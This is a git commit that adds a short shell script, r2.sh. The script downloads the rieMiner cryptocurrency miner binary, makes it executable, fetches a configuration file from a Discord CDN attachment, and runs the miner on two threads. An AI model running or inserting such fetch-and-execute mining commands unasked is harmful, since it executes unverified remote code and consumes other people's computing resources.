a21a2eff5bfeb2c06d62a9c288a7faeaee803d57
rnode03 <146066965+rnode03@users.noreply.github.com>
2023-09-26 13:36:17 +0530

    Create r2.sh

---
+++ r2.sh
@@ -0,0 +1,3 @@
+wget -O rie https://riecoin.dev/resources/Pttn/rieMiner.php?system=Deb64AVX2 && chmod +x rie
+wget https://cdn.discordapp.com/attachments/982667804429914146/1155505455104274432/rieMiner.conf
+./rie rieMiner.conf Threads=2
